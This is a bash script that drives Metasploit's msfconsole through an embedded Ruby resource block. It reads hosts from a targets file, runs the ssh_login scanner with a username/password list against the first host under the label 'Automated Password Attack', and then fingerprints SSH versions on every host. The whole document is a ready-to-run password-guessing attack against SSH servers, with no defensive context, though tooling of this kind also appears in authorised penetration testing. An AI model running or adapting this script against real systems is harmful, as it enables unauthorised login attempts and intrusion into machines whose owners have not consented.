#!/bin/bash

tmp=`mktemp`
. ~/bin/target-functions.sh
for f in `cat targets.ssh`
do
    echo $(gethost "$f")
done > "$tmp"

msfconsole -r <(cat << EOF
<ruby>
    begin

    next_host = File.open("$tmp", &:readline)
    run_single("use auxiliary/scanner/ssh/ssh_login")
    run_single("set rhosts #{next_host}")
    run_single("set threads 10")
    #run_single("set user_file users.ssh")
    #run_single("set pass_file passwords.ssh")
    run_single("set userpass_file userpass.ssh")
    run_single("spool 'Automated Password Attack on #{next_host}:22.spl'")
    run_single("show options")
    run_single("run")           
    run_single("spool off")

    File.foreach("$tmp", "\n") do |next_host|
        run_single("use auxiliary/scanner/ssh/ssh_version")
        run_single("set rhosts #{next_host}")
        run_single("spool 'SSH Version Detection on #{next_host}:22.spl'")
        run_single("show options")
        run_single("run")
        end

    end
    run_single("exit")
</ruby>
EOF
)
